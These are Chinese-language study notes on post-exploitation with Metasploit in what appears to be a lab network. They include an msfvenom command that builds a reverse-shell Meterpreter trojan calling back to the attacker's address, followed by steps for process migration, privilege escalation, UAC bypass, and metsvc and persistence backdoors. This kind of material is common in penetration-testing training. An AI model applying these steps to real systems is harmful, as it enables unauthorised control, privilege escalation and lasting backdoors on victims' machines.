MSF后渗透

操作应用场景：kali（192.168.10.129）拿下内网服务器（192.168.10.10，内网网段为10.10.10.0/24）的shell后的渗透操作

一.获取meterpreter会话

meterpreter是msf的一个payload，目标执行后返回一个meterpreter会话，和shell会话类似，但是功能更强大，是执行后渗透的实施通道

1.使用msfvenom生成payload


参数说明：

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.129 lport=12345 -f exe -o Win64.exe
生成的木马在当前目录下，要放到目标机上

2.msfconsole进行监听

3.目标机上执行木马，msf获取meterpreter会话

cmdshell升级成meterpreter

如果最开始获得的是cmdshell，后来发现此主机适合当作跳板，则选择升级成meterpreter
session -u cmdshell的id

二.进程迁移

1.手动迁移

获取当前进程信息:ps

进程迁移:migrate <稳定的进程号pid>

2.使用后渗透模块post/windows/manage/migrate自动迁移

run post/windows/manage/migrate

三.提权

查看当前权限getuid
若未系统权限则绕过此步

1.getsystem

默认选项 0 使用三种技术进行提权

2.绕过UAC

  • UAC（User Account Control，用户账户控制）是Windows 7及后续Windows系统引入的一种安全功能，启用该功能后，在用户没有显示允许的情况下，即便是本地管理员账户也无法更改操作系统。我们经常看到桌面用户使用的是管理员账户（虽然不推荐，但这种做法已司空见惯），因此即使恶意软件掌握了本地管理员账户，想修改注册表中的某些信息，或者在系统中创建一个新的服务，UAC也会及时阻止这类行为。
  • 将session放入后台backgroud
  • 查找可用baypassuac模块
  • 选择后设置选项 利用
  • 选择获得的会话后进入使用getsystem再次提权

3.漏洞提权

  • 查看当前有哪些可用提权模块search local/ms
  • 找到相应可用漏洞进行提权

七.后门

Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权

1.metsvc

受防火墙限制，任何人都能连接，并且针对服务器版本的系统，不好用，建议使用persistence

  • run metsvc

  • 成功上传3个文件metsrv.x86.dll，metsvc-server.exe，metsvc.exe，同时在目标机上新建一个服务，显示名称为Meterpreter，服务名称问metsvc，启动类型为“自动”，绑定在31337端口

  • 连接后门

2.persistence

实现重启后还有持续控制能力，并且由于是反弹shell，不受防火墙限制
